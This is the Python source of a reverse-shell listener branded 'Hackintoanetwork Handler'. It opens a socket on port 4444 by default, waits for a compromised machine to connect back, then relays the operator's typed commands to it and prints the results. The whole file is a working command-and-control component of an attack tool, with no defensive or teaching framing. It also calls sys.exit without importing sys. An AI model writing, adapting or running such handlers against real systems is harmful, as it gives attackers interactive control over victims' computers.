 #Server
import socket
import os

def set_sock(ip, port):
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.bind((ip, port))
	s.listen(1)
	conn,addr=s.accept()
	return conn,addr


def command(conn, addr):
	print("\033[1;36m[+] Connected to\033[1;m", addr)
	while True:
		command=input(">")
		if command=="exit":
			conn.send(b"exit")
			conn.close()
			break
		elif command=="cls":
			os.system('clear')
		elif command=="clear":
			os.system('clear')
		elif command=="":
			print("[ Input the command ]")
		else:
			conn.send(command.encode())
			output=conn.recv(65535)
			print(output.decode("euc-kr", "ignore"), end="")

if __name__=="__main__":
	if not os.geteuid() == 0:
    		sys.exit("""\033[1;91m\n[!] Hackintoanetwork must be run as root. ¯\_(ツ)_/¯\n\033[1;m""")
	os.system('clear')
	print("""\033[1;36m
  ┬ ┬┌─┐┌─┐┬┌─┬┌┐┌┌┬┐┌─┐┌─┐┌┐┌┌─┐┌┬┐┬ ┬┌─┐┬─┐┬┌─
  ├─┤├─┤│  ├┴┐││││ │ │ │├─┤│││├┤  │ ││││ │├┬┘├┴┐
  ┴ ┴┴ ┴└─┘┴ ┴┴┘└┘ ┴ └─┘┴ ┴┘└┘└─┘ ┴ └┴┘└─┘┴└─┴ ┴\033[1;m
  ┬ ┬┌─┐┌┐┌┌┬┐┬  ┌─┐┬─┐
  ├─┤├─┤│││ │││  ├┤ ├┬┘
  ┴ ┴┴ ┴┘└┘─┴┘┴─┘└─┘┴└─""")
	print('')
	print("""  [ Coded by @hackintoanetwork \033[1;36m|\033[1;m Website : hackintoanetwork.com ]""")
	print('')
	ip="0.0.0.0"
	PORT=input('  PORT : \033[1;36m')
	if PORT == '' :
		print ("  Default -> 4444") 
		PORT = 4444
	port = int(PORT)
	print('')
	print("\033[1;36m  [+] Waiting for Connection...")
	conn, addr=set_sock(ip, port)
	os.system('clear')
	command(conn, addr)